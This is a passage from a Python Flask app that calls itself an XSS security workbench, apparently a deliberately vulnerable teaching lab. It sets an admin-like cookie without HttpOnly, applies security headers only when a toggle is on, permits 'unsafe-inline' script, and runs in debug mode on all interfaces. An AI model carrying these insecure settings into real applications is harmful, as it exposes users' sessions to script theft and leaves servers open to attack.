    resp.set_cookie("usuario_activo", "mario_alabi_admin", httponly=False)

def aplicar_cabeceras_seguridad(resp):
    if configuracion["csp_activo"]:
        resp.headers["Content-Security-Policy"] = "default-src 'self' https://cdn.jsdelivr.net; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;"
        resp.headers["X-Content-Type-Options"] = "nosniff"
        resp.headers["X-Frame-Options"] = "DENY"
    return resp

if __name__ == "__main__":
    print("\n========================================================")
    print("  SECURITY WORKBENCH XSS - UNICAES")
    print("  Acceso en: http://localhost:5000")
    print("========================================================\n")
    app.run(host="0.0.0.0", port=5000, debug=True)
